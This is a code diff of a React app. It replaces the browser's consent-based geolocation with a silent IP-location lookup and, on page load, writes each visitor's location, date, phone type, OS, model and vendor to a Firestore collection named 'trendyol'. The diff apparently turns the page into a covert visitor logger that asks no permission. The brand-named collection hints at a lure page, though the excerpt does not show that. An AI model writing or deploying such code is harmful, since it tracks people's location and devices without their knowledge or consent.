@@ -5,7 +5,7 @@ import { useState } from "react";
 import axios from "axios";
 import { useEffect } from "react";
 import db from "./fireabase";
-
+import useReactIpLocation from "react-ip-details";
 import {
   isAndroid,
   isIOS,
@@ -17,31 +17,30 @@ import { useGeolocated } from "react-geolocated";
 function App() {
   const [finish, setFinished] = useState(false);
   const [ipAddress, setIpAddress] = useState("");
+  const {
+    currency,
+    exchangeRate,
+    ipResponse,
+    exchangeRateResponse,
+    errorMessage,
+    geoLocationPosition,
+    geoLocationErrorMessage,
+    currencyString,
+  } = useReactIpLocation({ numberToConvert: 100 });
 
   useEffect(() => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition((position) => {
-        setIpAddress({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-        });
-      });
-    }
-  }, []);
-
-  useEffect(() => {
-    !finish && ipAddress && sendBrowserInfo();
-  }, [finish, ipAddress]);
+    !finish && ipResponse && sendBrowserInfo();
+  }, [finish, ipResponse]);
   async function sendBrowserInfo() {
     let ip = {};
     const date = new Date();
-    ip.location = ipAddress;
+    ip.location = ipResponse;
     ip.turkishDate = date.toLocaleString("tr-TR");
     ip.telephoneType = isAndroid ? "Android" : isIOS ? "Iphone" : "Web";
     ip.osName = osName;
     ip.mobileModel = mobileModel;
     ip.mobileVendor = mobileVendor;
-    if (ip?.location) {
+    if (ip?.location?.city) {
       try {
         const docRef = await addDoc(collection(db, "trendyol"), ip);
         if (docRef?.id) {
